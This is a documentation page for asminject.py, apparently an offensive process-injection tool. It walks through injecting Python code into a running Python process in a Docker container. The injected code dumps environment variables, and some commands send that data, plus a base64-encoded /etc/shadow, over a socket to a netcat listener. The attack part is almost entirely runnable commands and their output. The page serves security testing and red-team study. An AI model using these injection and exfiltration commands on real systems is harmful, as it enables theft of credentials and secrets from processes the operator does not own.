# asminject.py examples - Python - Interact with a container only via injected Python code

<a href="../README.md">[ Back to the main README.md ]</a> - <a href="examples-python.md">[ Back to Python examples ]</a>

This scenario simulates a container that either does not allow access to an interactive shell, or use of the interactive shell would trigger an unwanted response.

Start a Python 3 process in a Docker container:
```
# docker run -v $(pwd)/practice/python_loop.py:/tmp/python_loop.py \
   --network=host -ti fedora

latest: Pulling from library/fedora
e1deda52ffad: Pull complete 
...omitted for brevity...
[root@3a78fa62ff5b /]# python3 /tmp/python_loop.py 
2022-06-29T21:30:19.037816 - Loop count 0
2022-06-29T21:30:24.043250 - Loop count 1
```

Locate the process ID for the Python process, then get a list of the binaries it has loaded:

```
# ps auxww | grep python                  

...omitted for brevity...
root     2378331  [...] python3 /tmp/python_loop.py

# cat /proc/2378331/maps

556d84513000-556d84514000 r--p [...] /usr/bin/python3.10
...omitted for brevity...
7f8483e8b000-7f8483ee4000 r--p [...] /usr/lib64/libpython3.10.so.1.0
...omitted for brevity...
```

Copy any necessary binaries out of the container and generate offsets from them. For example:

```
# docker cp 3a78fa62ff5b:/usr/bin/python3.10 ./docker-fedora-python3.10

# docker cp 3a78fa62ff5b:/usr/lib64/libpython3.10.so.1.0 ./docker-fedora-libpython3.10

# ./get_relative_offsets.sh docker-fedora-python3.10 > relative-offsets-docker-fedora-python3.10.txt

# ./get_relative_offsets.sh docker-fedora-libpython3.10 > relative-offsets-docker-fedora-libpython3.10.txt
```

Inject the Python code into the target process using the `execute_python_code.s` payload, e.g.:

```
# python3 ./asminject.py 2378331 execute_python_code.s \
	--relative-offsets /usr/bin/python3.10 relative-offsets-docker-fedora-python3.10.txt \
	--relative-offsets /usr/lib64/libpython3.10.so.1.0 relative-offsets-docker-fedora-libpython3.10.txt \
	--var pythoncode 'import os; print(os.environ);'
```

This should generate output in the terminal where the container was launched, e.g.:

```
2022-06-29T21:53:35.027900 - Loop count 278
environ({'HOSTNAME': '3a78fa62ff5b', 'DISTTAG': 'f36container', 'PWD': '/', 'FBR': 'f36', 'HOME': '/root',
...omitted for brevity...
'PATH': '/root/.local/bin:/root/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', '_': '/usr/bin/python3'})
2022-06-29T21:53:44.063159 - Loop count 279
```

To simulate a situation where the console is not visible, you can send Python code that will return the output to a TCP listener, e.g.:

```
% nc -nvlkp 7777
listening on [any] 7777 ...
```

Then, in another terminal:

```
# python3 ./asminject.py 2378331 execute_python_code.s \
   --relative-offsets /usr/bin/python3.10 relative-offsets-docker-fedora-python3.10.txt \
   --relative-offsets /usr/lib64/libpython3.10.so.1.0 relative-offsets-docker-fedora-libpython3.10.txt \
   --var pythoncode 'import os; import socket; s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(f\"{os.environ}\".encode()); s.close()'
```

You should see the output in the `nc` listener, e.g.:

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45528
environ({'HOSTNAME': 'copyroom', 'DISTTAG': 'f36container', 'PWD': '/', 'FBR': 'f36', 'HOME': '/root',
...omitted for brevity...
'PATH': '/root/.local/bin:/root/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', '_': '/usr/bin/python3'}
```

Copy a file out of the container:

```
# python3 ./asminject.py 2378331 execute_python_code.s \
   --relative-offsets /usr/bin/python3.10 relative-offsets-docker-fedora-python3.10.txt \
   --relative-offsets /usr/lib64/libpython3.10.so.1.0 relative-offsets-docker-fedora-libpython3.10.txt \
   --var pythoncode 'import base64; import os; import socket; f = open(\"/etc/shadow\", mode=\"rb\"); content = f.read(); f.close(); encoded = base64.b64encode(content); s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(encoded); s.close();'
```

The base64-encoded version should appear in the netcat listener:

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45530
cm9vdDohbG9ja2VkOjowOjk5O...omitted for brevity...
```
